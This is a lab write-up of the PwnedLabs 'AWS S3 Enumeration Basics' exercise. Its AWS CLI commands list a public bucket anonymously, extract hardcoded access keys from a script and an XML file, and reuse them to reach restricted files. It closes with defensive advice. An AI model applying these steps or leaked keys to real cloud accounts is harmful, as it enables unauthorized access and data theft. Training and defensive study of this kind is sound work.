---
layout:
  width: wide
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# AWS S3 Enumeration Basics

AWS S3 misconfigurations remain one of the most common entry points for adversaries targeting cloud environments. This walkthrough of the [_AWS S3 Enumeration Basics_](aws-s3-enumeration-basics.md) lab from PwnedLabs demonstrates not just the mechanics of bucket enumeration, but the reasoning process required to diagnose endpoint issues, escalate from anonymous access to credential abuse, and extract defensive lessons relevant to real-world engagements. The focus is on the decision-making path rather than a rote command sequence, making it directly useful for pentesters and red team operators.

## S3 Bucket Indicators

When spawning the lab, we get the following URL as a target: [http://dev.huge-logistics.com/](http://dev.huge-logistics.com/).&#x20;

<figure><img src="../../.gitbook/assets/pwnedlabs_s3_enum_homepage.png" alt=""><figcaption></figcaption></figure>

Upon enumerating the site manually, there are various indicators that point that this is hosted into an AWS S3 bucket. For instance, opening an image (_right click_ â†’ _Open image in new tab_) the link points to `s3.amazonaws.com`:

<figure><img src="../../.gitbook/assets/pwnedlabs_s3_enum_image.png" alt=""><figcaption></figcaption></figure>

In addition, inspecting the page's source code also includes `s3`-related links:

<figure><img src="../../.gitbook/assets/pwnedlabs_s3_enum_source.png" alt=""><figcaption></figcaption></figure>

The page's source code can be also be retrieved via CLI using `curl`:

{% code overflow="wrap" %}
```bash
$ curl -s http://dev.huge-logistics.com/ | grep s3
  <link rel="stylesheet" href="https://s3.amazonaws.com/dev.huge-logistics.com/static/style.css">
<link rel="shortcut icon" href="https://s3.amazonaws.com/dev.huge-logistics.com/static/favicon.png">
<img src="https://s3.amazonaws.com/dev.huge-logistics.com/static/logo.png" width="100">
<a href="#"><img src="https://s3.amazonaws.com/dev.huge-logistics.com/static/logo.png" id="res_logo"></a>
  <script  src="https://s3.amazonaws.com/dev.huge-logistics.com/static/script.js"></script>
```
{% endcode %}

## Anonymous Recon

Attempting to confirm the existence of the `dev.huge-logistics.com` bucket returns an error:

{% code overflow="wrap" %}
```bash
# List the bucket's contents
$ aws s3 ls s3://dev.huge-logistics.com/ --no-sign-request

Could not connect to the endpoint URL: "https://s3.temp.amazonaws.com/dev.huge-logistics.com?list-type=2&prefix=&encoding-type=url"
```
{% endcode %}

This occurs because the AWS CLI attempts to resolve the bucket via the default endpoint, but the lab environment redirects DNS through a private or emulated endpoint. The CLI interprets the request correctly but cannot reach the intended API service due to the internal network configuration. Explicitly specifying the region ensures the CLI constructs the correct S3 API endpoint:

{% code overflow="wrap" %}
```bash
# Enumerate the AWS region
$ nslookup dev.huge-logistics.com
Server:         10.255.255.254
Address:        10.255.255.254#53

Non-authoritative answer:
dev.huge-logistics.com  canonical name = dev.huge-logistics.com.s3-website-us-east-1.amazonaws.com.
<SNIP>

# Specify the region parameter and list the bucket's content again
$ aws s3 ls s3://dev.huge-logistics.com/ --no-sign-request --region us-east-1
                           PRE admin/
                           PRE migration-files/
                           PRE shared/
                           PRE static/
2023-10-16 18:00:47       5347 index.html
```
{% endcode %}

The corrected request aligns the CLI with the actual S3 API endpoint (`https://dev.huge-logistics.com.s3.us-east-1.amazonaws.com`) and successfully retrieves the bucket listing. It seems that we have access in only of two of the four directories on this bucket:

{% code overflow="wrap" %}
```bash
# Enumerate the admin directory
$ aws s3 ls s3://dev.huge-logistics.com/admin/ --no-sign-request --region us-east-1

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
```
{% endcode %}

{% code overflow="wrap" %}
```bash
# Enumerate the migration-files directory
$ aws s3 ls s3://dev.huge-logistics.com/migration-files/ --no-sign-request --region us-east-1

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
```
{% endcode %}

{% code overflow="wrap" %}
```bash
# Enumerate the static directory
$ aws s3 ls s3://dev.huge-logistics.com/static/ --no-sign-request --region us-east-1
2023-10-16 16:08:26          0
2023-10-16 17:52:30      54451 logo.png
2023-10-16 17:52:30        183 script.js
2023-10-16 17:52:31       9259 style.css
```
{% endcode %}

{% code overflow="wrap" %}
```bash
# Enumerate the shared directory
$ aws s3 ls s3://dev.huge-logistics.com/shared/ --no-sign-request --region us-east-1
2023-10-16 16:08:33          0
2023-10-16 16:09:01        993 hl_migration_project.zip
```
{% endcode %}

We can copy (download) the `hl_migration_project.zip` file and inspect it locally:

{% code overflow="wrap" %}
```bash
# Copy (download) the file locally
$ aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip . --no-sign-request --region us-east-1
download: s3://dev.huge-logistics.com/shared/hl_migration_project.zip to ./hl_migration_project.zip

# Unzip the file
$ unzip hl_migration_project.zip
Archive:  hl_migration_project.zip
  inflating: migrate_secrets.ps1
```
{% endcode %}

Inside the archive, a PowerShell migration script exists which contains embedded AWS credentials:

{% code overflow="wrap" %}
```bash
# Inspect the script
$ cat migrate_secrets.ps1
# AWS Configuration
$accessKey = "AKIA3SFMDAPOWOWKXEHU"
$secretKey = "Mw...<REDACTED>...b9"
$region = "us-east-1"
<SNIP>
```
{% endcode %}

Since we managed to discover AWS credentials, we can now use them to configure a new profile with AWS CLI:

{% code overflow="wrap" %}
```bash
# Create a new profile
$ aws configure --profile s3_enum
AWS Access Key ID [None]: AKIA3SFMDAPOWOWKXEHU
AWS Secret Access Key [None]: Mw...<REDACTED>...b9
Default region name [None]: us-east-1
Default output format [None]: json

# The equivalent of the whoami command in Linux
$ aws sts get-caller-identity --profile s3_enum
{
    "UserId": "AIDA3SFMDAPOYPM3X2TB7",
    "Account": "794929857501",
    "Arn": "arn:aws:iam::794929857501:user/pam-test"
}
```
{% endcode %}

With authenticated enumeration, restricted paths such as `admin/` become accessible, demonstrating how leaked credentials escalate privileges beyond what was initially available.

## Authenticated Recon

With authenticated access we can repeat the bucket enumeration steps to check if we now have further access:

{% code overflow="wrap" %}
```bash
# Enumerate the target bucket recursively
$ aws s3 ls s3://dev.huge-logistics.com/ --recursive --profile s3_enum
2023-10-16 16:08:38          0 admin/
2024-12-02 14:57:44         32 admin/flag.txt
2023-10-16 21:24:07       2425 admin/website_transactions_export.csv
2023-10-16 18:00:47       5347 index.html
2023-10-16 16:08:47          0 migration-files/
2023-10-16 16:09:26    1833646 migration-files/AWS Secrets Manager Migration - Discovery & Design.pdf
2023-10-16 16:09:25    1407180 migration-files/AWS Secrets Manager Migration - Implementation.pdf
2023-10-16 16:09:27       1853 migration-files/migrate_secrets.ps1
2023-10-16 19:00:13       2494 migration-files/test-export.xml
2023-10-16 16:08:33          0 shared/
2023-10-16 16:09:01        993 shared/hl_migration_project.zip
2023-10-16 16:08:26          0 static/
2023-10-16 17:52:30      54451 static/logo.png
2023-10-16 17:52:30        183 static/script.js
2023-10-16 17:52:31       9259 static/style.css
```
{% endcode %}

While we can now list both the `/admin` and `/migration-files` which we couldn't before, we can yet download anything from the former:

```bash
# Copy (download) the target files locally
$ aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt . --profile s3_enum
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden

$ aws s3 cp s3://dev.huge-logistics.com/admin/website_transactions_export.csv . --profile s3_enum
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

However, we can copy everything from the `/migration-files` directory:

```bash
# Copy (download) the target file locally
$ aws s3 cp s3://dev.huge-logistics.com/migration-files/test-export.xml . --profile s3_enum
download: s3://dev.huge-logistics.com/migration-files/test-export.xml to ./test-export.xml
```

The `test-export.xml` file is a configuration file that includes another pair of AWS credentials:

```bash
# Inspect the file
$ cat test-export.xml
<SNIP>
    <!-- AWS Production Credentials -->
    <CredentialEntry>
        <ServiceType>AWS IT Admin</ServiceType>
        <AccountID>794929857501</AccountID>
        <AccessKeyID>AKIA3SFMDAPOQRFWFGCD</AccessKeyID>
        <SecretAccessKey>t2...<REDACTED>...jP</SecretAccessKey>
        <Notes>AWS credentials for production workloads. Do not share these keys outside of the organization.</Notes>
    </CredentialEntry>
<SNIP>
```

This last pair of credentials are apparently for the IT administrator and, theoretically, should have access to the `/admin` directory:

```bash
# Configure a new profile
$ aws configure --profile it_admin
AWS Access Key ID [None]: AKIA3SFMDAPOQRFWFGCD
AWS Secret Access Key [None]: t2...<REDACTED>...jP
Default region name [None]: us-east-1
Default output format [None]: json

# Copy (download) the target file locally
$ aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt . --profile it_admin
download: s3://dev.huge-logistics.com/admin/flag.txt to ./flag.txt
```

### Defensive Considerations

Credential exposure in code artifacts highlights the need for proper secret management. Hardcoding credentials should be replaced with AWS Secrets Manager or Parameter Store, and automated scans should enforce this policy across repositories. At the storage layer, enabling **S3 Block Public Access** at both the account and bucket level prevents inadvertent anonymous access. For detection, CloudTrail data events combined with S3 access logs provide visibility into suspicious `ListBucket` and `GetObject` activity, while GuardDuty enriches this data with anomaly detection. Detection engineering should focus on identifying repetitive object enumeration patterns and downloads from untrusted IP ranges, which are indicative of adversarial behavior.

### Key Takeaways

The value of this lab extends beyond the act of retrieving a ZIP file. The real skill lies in recognizing the difference between website and API endpoints, troubleshooting CLI errors, and pivoting from anonymous enumeration to authenticated escalation through credential discovery. While many walkthroughs document the exact commands, a high-value approach emphasizes reasoning and adaptability, which are critical in real-world operations. By combining offensive methodology with defensive recommendations, this walkthrough delivers insights useful to both red teamers and defenders tasked with securing AWS environments.

